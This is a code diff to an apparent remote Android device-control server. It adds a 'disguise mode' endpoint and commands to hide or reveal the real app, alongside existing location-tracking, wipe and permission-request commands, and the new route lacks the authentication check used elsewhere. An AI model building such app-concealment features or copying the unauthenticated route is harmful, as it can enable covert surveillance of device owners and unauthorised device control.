@@ -177,6 +177,39 @@ router.put('/:deviceId/permissions', async (req, res) => {
   }
 });
 
+// Update device disguise mode
+router.put('/:deviceId/disguise', async (req, res) => {
+  try {
+    const deviceIdParam = req.params.deviceId;
+    const { disguiseMode } = req.body;
+    
+    // Find device by MongoDB _id or Android deviceId
+    let device = null;
+    try {
+      device = await Device.findById(deviceIdParam);
+    } catch (e) {
+      // Not a valid ObjectId
+    }
+    if (!device) {
+      device = await Device.findOne({ deviceId: deviceIdParam });
+    }
+    
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+    
+    device.disguiseMode = disguiseMode || 'normal';
+    await device.save();
+    
+    console.log(`Disguise mode updated for device ${device.name}: ${disguiseMode}`);
+    
+    res.json({ success: true, message: 'Disguise mode updated', mode: disguiseMode });
+  } catch (error) {
+    console.error('Failed to update disguise mode:', error);
+    res.status(500).json({ error: 'Failed to update disguise mode' });
+  }
+});
+
 // Send command to device
 router.post('/:deviceId/command', protect, async (req, res) => {
   try {
@@ -249,6 +282,9 @@ router.post('/:deviceId/command', protect, async (req, res) => {
       'get_location',
       'wipe_data',
       'uninstall_app',
+      // App disguise commands
+      'set_disguise_mode',
+      'reset_app', // Show real app again
       // Permission request commands
       'request_location_permission',
       'request_background_location_permission',
